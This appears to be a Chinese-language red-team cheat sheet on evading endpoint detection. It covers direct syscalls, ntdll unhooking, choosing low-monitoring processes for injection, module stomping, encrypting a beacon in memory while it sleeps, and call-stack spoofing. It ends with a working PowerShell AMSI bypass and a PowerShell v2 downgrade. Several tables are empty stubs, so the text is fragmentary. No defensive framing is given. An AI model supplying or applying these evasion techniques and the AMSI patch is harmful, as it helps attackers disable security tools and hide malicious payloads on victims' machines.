

---


|--------|-----------|---------|

---


```
原理：不通过 ntdll.dll，直接用 syscall 指令调用内核
工具：SysWhispers3 / HellsGate / TartarusGate
效果：绕过所有用户态 Hook
```


```
方法 A：从磁盘重新映射 ntdll.dll
方法 B：从 KnownDlls 目录加载干净副本
方法 C：从挂起的进程中复制 .text 段
效果：恢复被 Hook 的 API 到原始状态
```


```
推荐注入目标（低监控）：
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe（风险稍高）

避免注入：
- lsass.exe（高度监控）
- svchost.exe（部分 EDR 重点关注）
- powershell.exe / cmd.exe
```


```
原理：将 payload 写入已加载的合法 DLL 的 .text 段
效果：内存扫描时看到的是合法模块，不是可疑的 RWX 内存
```


```
原理：beacon sleep 期间加密自身内存
效果：内存扫描时找不到 payload 特征
实现：注册 Timer 回调，sleep 前加密，唤醒后解密
```


```
原理：伪造调用栈，使 API 调用看起来来自合法代码
效果：绕过基于调用栈的行为检测
```

---


|------|------|---------|

---

## LOLBins（Living Off the Land）


|------|------|---------|

---


```powershell
# 经典 Patch（可能被签名检测）
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 更隐蔽的方式：反射修改 AmsiScanBuffer
# 或使用 PowerShell 降级到 v2（无 AMSI）
powershell -version 2
```

---
